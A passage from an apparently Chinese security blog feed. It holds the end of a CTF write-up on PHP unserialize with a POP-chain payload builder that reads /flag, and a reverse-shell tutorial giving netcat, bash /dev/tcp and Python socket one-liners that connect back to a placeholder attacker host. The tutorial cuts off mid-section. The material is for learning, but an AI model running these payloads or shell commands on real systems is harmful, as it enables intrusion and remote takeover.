class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  <span class="title class_">Start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>尾部可以看到 <code>Room</code>  类中有个 <code>Get_hint()</code>  方法，里面有一个 <code>file_get_contents</code> ，可以实现任意文件读取，我们就可以利用这个读取 flag 文件了，然后就是往前倒推， <code>Room</code>  类中 <code>__invoke()</code>  方法调用了 <code>Get_hint()</code> ，然后 <code>Room</code>  类的 <code>__get()</code>  里面有个 <code>return $function()</code>  可以调用 <code>__invoke()</code> ，再往前看， <code>Info</code>  类中的 <code>__toString()</code>  中有 <code>Room</code>  类中不存在的属性，所以可以调用 <code>__get()</code> ，然后 <code>Start</code>  类中有个 <code>_sayhello()</code>  可以调用 <code>__toString()</code> ，然后在 <code>Start</code>  类中 <code>__wakeup()</code>  方法中直接调用了 <code>_sayhello()</code> ，而我们知道的是，输入字符串之后就会先进入 <code>__wakeup()</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; a = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在构建 pop 链时，除 <code>__construct</code>  函数一般不需要写出，   变量的权限与源码保持一致，在串联对象时，需要与源码的对应关系保持一致，比如： <code>$b -&gt; file['filename'] = $c;</code></p><p>————END————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-unserialize&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#php-unserialize&quot;&gt;#&lt;/a&gt; PHP Unserialize&lt;/h1&gt;
&lt;h2 id=&quot;什么是序列化和反序列化&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Reverse shell</title>
    <link href="http://example.com/2024/04/09/Reverse-shell/"/>
    <id>http://example.com/2024/04/09/Reverse-shell/</id>
    <published>2024-04-09T04:29:05.000Z</published>
    <updated>2024-04-11T03:47:13.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell">#</a> 反弹 shell</h1><h2 id="反弹shell-2"><a class="markdownIt-Anchor" href="#反弹shell-2">#</a> 反弹 shell</h2><h3 id="linux环境下常用网络工具"><a class="markdownIt-Anchor" href="#linux环境下常用网络工具">#</a> linux 环境下常用网络工具</h3><h4 id="ncnetcat"><a class="markdownIt-Anchor" href="#ncnetcat">#</a> nc(netcat)</h4><p>参数说明</p><pre><code>nc.exe -h 即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...nc -l -p port [options] [hostname] [port]-d          后台模式-e          程序重定向，一旦连接，就执行 [危险!!]-g gateway  source-routing hop point[s], up to 8    设置路由器跃程通信网关，最多可设置8个。-G num      source-routing pointer: 4, 8, 12, ...   设置来源路由指向器，其数值为4的倍数。-h          帮助信息-i secs     延时的间隔-l          监听模式，用于入站连接 (监听本地端口)-L          连接关闭后,仍然继续监听-n          指定数字的IP地址，不能用hostname。即直接使用IP地址，而不通过域名服务器。-o file     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port     本地端口号 (指定本地端口 )-r          随机本地及远程端口-s addr     本地源地址-t          使用TELNET交互方式(用telnet来回应 )-u          UDP模式-v          详细输出--用两个-v( -vv)可得到更详细的内容. 获得端口信息-w secs     timeout的时间-z          将输入输出关掉--只用于扫描. 端口的表示方法可写为M-N的范围格式。</code></pre><p>连接远程主机</p><p>​ <code>nc -nvv Target_ip Target_port</code></p><p>监听本地主机</p><p>​ <code>nc -l -p Local_port</code></p><p>端口扫描</p><p>​ <code>nc -v Target_ip Target_port #可指定范围</code></p><p>端口监听</p><p>​ <code>nc -l -p Local_port</code></p><p>远程文件传输</p><p>​ <code>nc Target_ip Target_port &lt; Target_File</code></p><p>模拟 HTTP headers</p><pre><code>[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browserHTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]echo -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80连接到主机并执行</code></pre><p>正向 shell，反向 shell</p><h4 id="curl"><a class="markdownIt-Anchor" href="#curl">#</a> curl</h4><p>HTTP 命令行工具，支持文件的上传和下载，是综合传输工具</p><p>发送 GET 请求</p><p>​ <code>curl URL?a=1&amp;b=nihao</code></p><p>发送 POST 请求</p><p>​ <code>curl -X POST -d 'a=1&amp;b=nihao' URL</code></p><p>发送 json 格式请求</p><p>​ <code>curl -H &quot;Content-type: application?json&quot; -X POST -d '&#123;&quot;abc&quot;:123.&quot;bcd&quot;:&quot;nihao&quot;&#125;' URL</code></p><p>​ <code>curl -H &quot;Content-Type: application/json&quot; -X POST -d @test.json URL</code></p><h5 id="1-下载option-o或者option-o"><a class="markdownIt-Anchor" href="#1-下载option-o或者option-o">#</a> 1、下载 (option:-o 或者 option:-O)</h5><p>1.1、下载页面：</p><p><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</code> <br># 要注意 - O 这里后面的 url 要具体到某个文件，不然抓不下来<br> <code>curl -O http://www.linux.com/dodo1.JPG</code></p><p>1.2：循环下载<br>有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样。这样就会把 dodo1，dodo2，dodo3，dodo4，dodo5 全部保存下来<br> <code>curl -O http://www.linux.com/dodo[1-5].JPG</code></p><p>1.3：下载重命名<br>在 hello/dodo1.JPG 的文件下载下来就会变成 hello_dodo1.JPG, 其他文件依此类推，从而有效的避免了文件被覆盖<br> <code>curl -o #1_#2.JPG http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>由于下载的 hello 与 bb 中的文件名都是 dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。<br> <code>curl -O http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>1.4：分块下载 (option：-r)</p><p><code>curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG</code> <br> <code>cat dodo1_part* &gt; dodo1.JPG </code></p><p>#这样就可以查看 dodo1.JPG 的内容了</p><p>1.5：通过 ftp（文件传输协议）下载文件 (option：-u)<br> curl 可以通过 ftp 下载文件，curl 提供两种从 ftp 中下载的语法<br> <code>curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG</code> <br> <code>curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG</code></p><p>1.6: 下载，显示进度条 (option：-#) 或不显示进度条 (option：-s)<br> <code>curl -# -O http://www.linux.com/dodo1.JPG  </code> <br> <code>curl -s -O http://www.linux.com/dodo1.JPG</code></p><p>1.7、下载，断点续传 (-C <offset>)<br> 断点续转，从文件头的指定位置开始继续下载 / 上传；offset 续传开始的位置，如果 offset 值为 “-”，curl 会自动从文件中识别起始位置开始传输；<br> <code>curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso</code> <br> <code>curl -C -O http://www.linux.com/dodo1.JPG</code></offset></p><h5 id="2-上传文件option-t"><a class="markdownIt-Anchor" href="#2-上传文件option-t">#</a> 2、上传文件 (option:-T)</h5><p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://www.linux.com/img/</code></p><h5 id="3-伪造来源页面伪造referer盗链-option-e"><a class="markdownIt-Anchor" href="#3-伪造来源页面伪造referer盗链-option-e">#</a> 3、伪造来源页面 | 伪造 referer | 盗链 (option：-e)</h5><p>很多服务器会检查 http 访问的 referer 从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的 referer 地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的 referer 地址不是首页的地址，就断定那是个盗连了<br> #这样就会让服务器其以为你是从 www.linux.com 点击某个链接过来的<br> <code>curl -e &quot;www.linux.com&quot; http://mail.linux.com</code> <br># 告诉爱 E 族，我是从百度来的<br> <code>curl -e http://baidu.com http://aiezu.com</code></p><h5 id="4-伪造代理设备模仿浏览器"><a class="markdownIt-Anchor" href="#4-伪造代理设备模仿浏览器">#</a> 4、伪造代理设备 (模仿浏览器)</h5><p>有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl 内置 option:-A 可以让我们指定浏览器去访问网站<br> <code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot; http://www.linux.com</code> <br># 告诉爱 E 族，我是 GOOGLE 爬虫蜘蛛（其实我是 curl 命令）<br> <code>curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com</code> <br># 告诉爱 E 族，我用的是微信内置浏览器<br> <code>curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com</code></p><h5 id="5-设置http请求"><a class="markdownIt-Anchor" href="#5-设置http请求">#</a> 5、设置 http 请求</h5><p>5.1、设置 http 请求头 (或 option:-H 或 option:–head)<br> <code>curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com</code></p><p>5.2、指定 proxy 服务器以及其端口 (option::-x)<br># 很多时候上网需要用到代理服务器 (比如是使用代理服务器上网或者因为使用 curl 别人网站而被别人屏蔽 IP 地址的时候)，幸运的是 curl 通过使用内置 option：-x 来支持设置代理<br> <code>curl -x 192.168.100.100:1080 http://www.linux.com</code></p><h5 id="6-http响应头"><a class="markdownIt-Anchor" href="#6-http响应头">#</a> 6、http 响应头</h5><p>6.1、查看 http 响应头 (option:-I)<br># 看看本站的 http 头是怎么样的<br> <code>curl -I  http://aiezu.com</code> <br> 输出：<br>HTTP/1.1 200 OK<br>Date: Fri, 25 Nov 2016 16:45:49 GMT<br>Server: Apache<br>Set-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br>Pragma: no-cache<br>Vary: Accept-Encoding<br>Content-Type: text/html; charset=utf-8</p><p>6.2、保存 http 的 response 里面的 header 信息 (option:-D)<br> <code>curl -D cookied.txt http://www.linux.com</code> <br> 执行后 cookie 信息就被存到了 cookied.txt 里面了<br>注意：-c (小写) 产生的 cookie 和 - D 里面的 cookie 是不一样的。</p><h5 id="7-发送表单数据"><a class="markdownIt-Anchor" href="#7-发送表单数据">#</a> 7、发送表单数据</h5><p><code>curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/</code></p><h5 id="8-cookie"><a class="markdownIt-Anchor" href="#8-cookie">#</a> 8、cookie</h5><p>8.1、发送 cookie (option:-b）<br># 有些网站是使用 cookie 来记录 session 信息。对于 chrome 这样的浏览器，可以轻易处理 cookie 信息，但在 curl 中只要增加相关参数也是可以很容易的处理 cookie<br> <code>curl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code> <br># 很多网站都是通过监视你的 cookie 信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的 cookie 信息。内置 option: -b<br> <code>curl -b cookiec.txt http://www.linux.com</code></p><p>8.2、保存 http 的 response 里面的 cookie 信息 (option:-c）<br>执行后 http 的 response 里面的 cookie 信息就被存到了 cookiec.txt 里面了<br> <code>curl -c cookiec.txt  http://www.linux.com</code></p><h4 id="wget"><a class="markdownIt-Anchor" href="#wget">#</a> wget</h4><p>wget 是一个下载文件的工具，它用在命令行下。对于 Linux 用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p><p><code>wget URL</code></p><h5 id="与curl区别"><a class="markdownIt-Anchor" href="#与curl区别">#</a> 与 curl 区别</h5><p>wget 是个专职的下载利器，简单，专一，极致；而 curl 可以下载，但是长项不在于下载，而在于模拟提交 web 数据，POST/GET 请求，调试网页，等等。在下载上，也各有所长，wget 可以递归，支持断点；而 curl 支持 URL 中加入变量，因此可以批量下载。个人用途上，我经常用 wget 来下载文件，加 -c 选项不怕断网；使用 curl 来跟网站的 API 交互，简便清晰。</p><h4 id="ping"><a class="markdownIt-Anchor" href="#ping">#</a> ping</h4><p>ping 命令本身处于应用层，相当于一个应用程序，它直接使用网络层的 ICMP 协议，ping 用来检查网络是否通畅或者网络连接速度的命令。</p><h4 id="talent"><a class="markdownIt-Anchor" href="#talent">#</a> talent</h4><p>telnet 协议是 TCP/IP 协议族的其中之一，是 Internet 远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet 通常是用来探测指定 ip 是否开放指定端口。</p><p>open : 使用 openhostname 可以建立到主机的 Telnet 连接。</p><p>close : 使用命令 close 命令可以关闭现有的 Telnet 连接。</p><p>display : 使用 display 命令可以查看 Telnet 客户端的当前设置。</p><p>send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：</p><p>ao : 放弃输出命令。</p><p>ayt : “Are you there” 命令。</p><p>esc : 发送当前的转义字符。</p><p>ip : 中断进程命令。</p><p>synch : 执行 Telnet 同步操作。</p><p>brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。</p><h4 id="ssh"><a class="markdownIt-Anchor" href="#ssh">#</a> ssh</h4><p>简单来说，ssh 和 telnet 是实现相同的功能，ssh 中 数据是经过加密的，是安全的，而 Telnet 是明文传输的，ssh 是加密的，基于 SSL 。</p><h3 id="正向shell如何连接"><a class="markdownIt-Anchor" href="#正向shell如何连接">#</a> 正向 shell 如何连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p><p>目标主机： <code>nc -lvp Target_port -e /bin/sh</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png" alt="image.png"></p><p>本地主机：  <code>nc Target_ip Target_port</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png" alt="image.png"></p><h3 id="什么是反弹shell"><a class="markdownIt-Anchor" href="#什么是反弹shell">#</a> 什么是反弹 shell</h3><p>参考：<a class="link" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。</p><p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？</p><p>有如下情况：</p><p>1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2. 目标机器的 ip 动态改变，你不能持续控制。</p><p>3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。</p><h3 id="反弹shell的方式"><a class="markdownIt-Anchor" href="#反弹shell的方式">#</a> 反弹 shell 的方式</h3><h4 id="netcat"><a class="markdownIt-Anchor" href="#netcat">#</a> netcat</h4><p>攻击机开启监听：  <code>nc -lvp Target_port</code></p><p>-lvp：l 监听，v 输出交互过程，p 端口</p><p>靶机连接攻击机：  <code>nc Target_ip Target_port -e /bin/bash</code></p><h4 id="bash"><a class="markdownIt-Anchor" href="#bash">#</a> bash</h4><p>Bash 反弹 shell 的方法非常好用，题目的服务器环境可能没有 nc, 但是一定会有 bash</p><p>同样的我们还是用 nc -lvp Target_Port 在攻击机的端口开启监听</p><p><code>nc -lvp Target_Port</code></p><p>这次我们使用 Bash 结合重定向来反弹 shell</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1</code></p><p>或者  <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1&quot;</code></p><p>推荐使用后者，使用前者弹 shell, 当命令在服务端 shell 中执行时可能存在 /bin/sh 的软连接并不指向 bash 的问题，导致报错 <code>/bin/sh: 1:Syntax error:Bad fd number</code></p><p>bash -i 产生 bash 交互环境 &gt;&amp; 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port 让目标主机发起与攻击机在 Target_Port 上的 TCP 连接，0&gt;&amp;1 将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。</p><p>Bash 产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个 TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p><p>[关于上述 bash 命令的详细解释](<a class="link" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹 bash shell 命令详解 - pandaes - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p><h4 id="pythion反弹shell"><a class="markdownIt-Anchor" href="#pythion反弹shell">#</a> Pythion 反弹 shell</h4><p>同样的我们还是在攻击机开始端口监听， <code>nc -lvp Target_Port</code></p><p>在靶机上执行 <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;Target_IP&quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><h4 id="curl反弹shell"><a class="markdownIt-Anchor" href="#curl反弹shell">#</a> curl 反弹 shell</h4><p>简单来说就是将 Bash 重定向这一句内容写入文件，让靶机用 curl 